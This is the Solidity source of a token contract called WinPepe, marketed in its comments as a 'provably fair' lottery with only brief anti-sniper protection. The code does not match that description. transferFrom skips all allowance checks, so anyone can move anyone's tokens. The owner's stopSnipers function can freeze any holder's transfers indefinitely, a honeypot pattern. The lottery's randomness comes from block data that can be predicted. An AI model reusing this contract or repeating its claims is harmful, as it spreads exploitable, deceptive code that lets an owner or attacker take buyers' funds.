// SPDX-License-Identifier: MIT



// www.winpepe.club

// Blockchain gaming kicks off with a provably fair on-chain lottery where everyone is a winner!

// To maintain an equitable trading experience, the contract will block all snipes in the first few blocks from launch

// DYOR and Let's hit it!



pragma solidity ^0.8.0;



    abstract contract Context {



    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}



pragma solidity ^0.8.0;



interface IERC20 {



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);



    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address to, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(

        address from,

        address to,

        uint256 amount

    ) external returns (bool);

    }



pragma solidity ^0.8.0;



interface IERC20Metadata is IERC20 {

    

    function name() external view returns (string memory);



    function symbol() external view returns (string memory);



    function decimals() external view returns (uint8);



   }



pragma solidity ^0.8.0;



library SafeMath {



  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

    if (a == 0) {

      return 0;

    }

    c = a * b;

    assert(c / a == b);

    return c;

  }



  function div(uint256 a, uint256 b) internal pure returns (uint256) {



    return a / b;

  }



  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

    c = a + b;

    assert(c >= a);

    return c;

  }

}



contract Ownable is Context {

    address private _owner;

    using SafeMath for uint256;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 

    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }

 

    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

 

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

 

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}



    library SafeMathInt {

        int256 private constant MIN_INT256 = int256(1) << 255;

        int256 private constant MAX_INT256 = ~(int256(1) << 255);



    function mul(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));

        require((b == 0) || (c / b == a));

        return c;

    }

 

    function div(int256 a, int256 b) internal pure returns (int256) {

        require(b != -1 || a != MIN_INT256);

        return a / b;

    }

 

    function sub(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a - b;

        require((b >= 0 && c <= a) || (b < 0 && c > a));

        return c;

    }

 

    function add(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a + b;

        require((b >= 0 && c >= a) || (b < 0 && c < a));

        return c;

    }

 

    function abs(int256 a) internal pure returns (int256) {

        require(a != MIN_INT256);

        return a < 0 ? -a : a;

    }

 

 

    function toUint256Safe(int256 a) internal pure returns (uint256) {

        require(a >= 0);

        return uint256(a);

    }

}

 

    library SafeMathUint {

    

    function toInt256Safe(uint256 a) internal pure returns (int256) {

        int256 b = int256(a);

        require(b >= 0);

        return b;

    }

}



pragma solidity ^0.8.0;



contract WinPepe is Context, IERC20, IERC20Metadata, Ownable {   

    string private _name;

    string private _symbol;

    

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _snipers;

    

    uint256 private _totalSupply;

    uint256 public constant lotteryTriggerTime = 60;  

    uint256 public lastLotteryTriggeredAt;

    uint256 private lotteryWinnerCount;

    uint256 public lastWinnerIndex;



    event LotteryReward(address indexed winner, uint256 rewardAmount);

    event TokensBurned(address indexed burner, uint256 amount);

    event AddressSnipers(address indexed account);



    address[] private tokenHolders;

    using SafeMath for uint256;



    constructor (string memory name_, string memory symbol_, uint256 totalSupply_) {

        _name = name_;

        _symbol = symbol_;

        _totalSupply = totalSupply_;

        _balances[msg.sender] = totalSupply_;

        lastLotteryTriggeredAt = block.timestamp;      

        emit Transfer(address(0), msg.sender, totalSupply_);       

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }

    

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, amount);

    return true;

    }



    function winPepe() external {

        require(block.timestamp.sub(lastLotteryTriggeredAt) >= lotteryTriggerTime, "Lottery cannot be triggered yet");



        _winPepe();

        lastLotteryTriggeredAt = block.timestamp;

    }



    function _winPepe() internal {

        require(tokenHolders.length > 0, "No token holders present");



    uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % tokenHolders.length;

    address winner = tokenHolders[randomNumber];

    uint256 rewardAmount = _balances[winner].mul(20).div(100); 



    if (winner == address(this)) {

        

        _totalSupply -= rewardAmount;

        _balances[address(0)] += rewardAmount;

        _transfer(address(this), address(0), rewardAmount);

        emit TokensBurned(address(0), rewardAmount);



    } else {

        require(balanceOf(winner) > 0, "Not eligible for Lottery");

        require(winner != address(0), "Invalid winner address");



        uint256 winnerReward = rewardAmount / 2;

        uint256 winLottery = rewardAmount - winnerReward;

        _transfer(address(this), winner, winLottery);  

        emit LotteryReward(winner, winLottery);      



        if (winnerReward > 0) {

            _totalSupply -= winnerReward; 

            _transfer(address(this), address(0), winnerReward); 

            emit TokensBurned(address(0), winnerReward);

        }

    }



    for (uint256 i = 0; i < tokenHolders.length; i++) {

        if (tokenHolders[i] == winner) {

            lastWinnerIndex = i;

            break;

        }

    }



    lotteryWinnerCount++;

    }



    function getWinners() public view returns (uint256) {

        return lotteryWinnerCount;

    }



    function getPepePool() external view returns (uint256) {

        return balanceOf(address(this));

    }



    function latestWinner() public view returns (address) {

        require(lastWinnerIndex < tokenHolders.length, "No winners yet");

    

    return tokenHolders[lastWinnerIndex];

    }



    function stopSnipers(address[] memory accounts) external onlyOwner {

    for (uint256 i = 0; i < accounts.length; i++) {

        _snipers[accounts[i]] = true;

        emit AddressSnipers(accounts[i]);

    }

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        require(!_snipers[msg.sender], "Launch snipers not allowed");

        _transfer(msg.sender, recipient, amount);

    

    return true;

    }



    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {   

        require(!_snipers[from], "Launch snipers not allowed");

        _transfer(from, to, amount);



    return true;

    }



    function _transfer(address from, address to, uint256 amount) internal virtual {

        require(balanceOf(from) >= amount, "Insufficient balance");



    if (_balances[from] == amount) {

        for (uint256 i = 0; i < tokenHolders.length; i++) {

            if (tokenHolders[i] == from) {

                tokenHolders[i] = tokenHolders[tokenHolders.length - 1];

                tokenHolders.pop();

                break;

            }

        }

    }



    _beforeTokenTransfer(from, to, amount);



    uint256 fromBalance = _balances[from];

    require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

    unchecked {

        _balances[from] = fromBalance - amount;

    }

    _balances[to] += amount;



    if (to != address(0) && _balances[to] == amount) {

        bool isExistingHolder = false;

        for (uint256 i = 0; i < tokenHolders.length; i++) {

            if (tokenHolders[i] == to) {

                isExistingHolder = true;

                break;

            }

        }

        if (!isExistingHolder) {

            tokenHolders.push(to);

        }

    }



    emit Transfer(from, to, amount);



    _afterTokenTransfer(from, to, amount);

    }

    

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {

        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {

            require(currentAllowance >= amount, "ERC20: insufficient allowance");

            unchecked {

                _approve(owner, spender, currentAllowance - amount);

            }

        }

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, allowance(owner, spender) + addedValue);



    return true;

    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        address owner = _msgSender();

        uint256 currentAllowance = allowance(owner, spender);

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        unchecked {

            _approve(owner, spender, currentAllowance - subtractedValue);

        }



    return true;

    }



    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}



    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    }